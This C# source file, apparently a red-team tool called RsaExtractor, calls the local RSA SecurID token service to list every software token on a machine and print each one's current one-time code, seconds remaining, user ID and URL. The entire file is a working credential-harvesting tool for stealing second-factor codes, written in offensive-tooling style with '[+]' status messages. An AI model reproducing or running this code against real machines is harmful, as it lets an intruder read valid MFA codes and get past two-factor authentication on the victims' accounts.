using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using rsatokenbroker;
namespace RsaExtractor
{
    class Program
    {

        static CRsaTokenService tokenService = new CRsaTokenService();
        static void PrintToken(CToken token)
        {
            
            int timeleft = 0;
            String currentCode = tokenService.getCurrentCode(token.serialNumber, "", out timeleft);
            Console.WriteLine("\n===== Token With Serial Number: {0}", token.serialNumber);
            Console.WriteLine("Token Code: {0} \nTimeleft: {1} \nUserId: {2} \nURL: {3}",currentCode, timeleft, token.userId, string.IsNullOrEmpty(token.url) ? "No URL" : token.url);

            

        }
        static void Main(string[] args)
        {


            // Print all the tokens serials using CRSAtoken Service class .serials method
            // Check if it requires a PIN
            // Extract all the tokens


            CToken token;
            Console.WriteLine("[+] Initialized the CRsaTokenService ");
            String[] serials = tokenService.Serials.Split(',');
            
            if(serials.Length > 0)
            {
                Console.WriteLine("[+] Found {0} tokens",serials.Length);
                foreach(String serial in serials)
                {
                    token = new CToken();
                    token.Init(serial);

                    PrintToken(token);
                }
            }
            else
            {
                Console.WriteLine("[-] No tokens found ");
                
            }
           

        }
    }
}
